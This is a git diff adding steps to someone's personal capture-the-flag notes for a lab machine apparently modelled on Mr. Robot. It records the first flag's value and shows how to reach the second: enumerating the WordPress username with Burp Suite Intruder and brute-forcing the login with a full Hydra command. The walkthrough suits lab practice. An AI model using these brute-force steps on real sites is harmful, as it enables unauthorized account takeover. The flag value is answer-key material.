@@ -33,7 +33,41 @@ PW: ?
 4. Go to Website w/ new directory
         10.10.30.50/key-1-of-3.txt
 
+5. Flag 1:
+        073403c8a58a1f80d943455fb30724b9                                                             
 
 
                                     ##### FLAG 2 #####
-  
+
+1. Go to Website w/ other directory
+        10.10.30.50/fsocity.dic
+        *Download file
+
+2. Burpsuite (Find UserID)
+        A. Intercept log in attempt
+
+            Results:
+            log=admin&pwd=admin&wp-submit=Log+In&redirect_to=http%3A%2P%2F10.10.30.50%2Fwp-admin%2F&testcookie=1
+
+        B. Forward to Intruder:
+            log=admin&pwd-admin
+
+        C. Clear Perameters:
+                (clear $)
+
+        D. Add Variable:
+                (Add $)
+
+        E. Load Payload:
+                Load fsocity.dic.dic > Start Attack
+
+        F. Results:
+                user: Elliot
+              
+3. Hydra (Find User PassWord)
+        A. sudo hydra -vV -l elliot -P /home/eezy/Downloads/fsocity.dic.dic 10.10.30.50 http-post-form '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:F=is incorrect'
+      
+          Results:
+
+
+
